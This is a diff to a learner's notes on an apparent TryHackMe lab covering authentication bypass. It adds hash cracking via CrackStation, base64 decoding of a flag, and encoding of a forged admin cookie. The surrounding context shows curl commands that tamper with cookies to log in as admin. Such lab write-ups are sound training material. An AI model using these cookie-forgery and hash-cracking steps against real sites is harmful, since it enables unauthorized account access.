@@ -4,7 +4,9 @@
 
 ## Tools Used
 - [x] ffuf
-- [x] browser tool (network)  
+- [x] browser tool (network)
+- [x] CrackStation
+- [x] Base64decode
 
 ## Method (What I Did)
 
@@ -33,9 +35,10 @@
 - Scanned browser network tool for cookies, reslut `admin=false; session=ab907c0c1556c8ffda3d6f0b68bec51c`
 - Tested page to understand other cookie paremeters `curl http://10.201.70.35/cookie-test` Returned `Not Logged In`
 - Used info to change admin and login paremters `curl -H "Cookie: logged_in=true; admin=false" http://10.201.70.35/cookie-test` Returned `Logged In As An Admin - THM{COOKIE_TAMPERING}`
-- 
-
+- Cracked the hash `3b2a1053e3270077456a79192070aa78` with Crackstation to get the value `463729`
+- Decoded the value `VEhNe0JBU0U2NF9FTkNPRElOR30=` and got `THM{BASE64_ENCODING}`
+- Encoded `{"id":1,"admin":true}` which returned `eyJpZCI6MSwiYWRtaW4iOnRydWV9`
 
 ## Key Takeaway
-- ...
+- Ensuring your secuirty for authitcation meets logical standards is a must. Learning info based off of rejected logins isn't ideal nor is basic login credentials. Also basic credential options like admin=true/false creates problems.
 
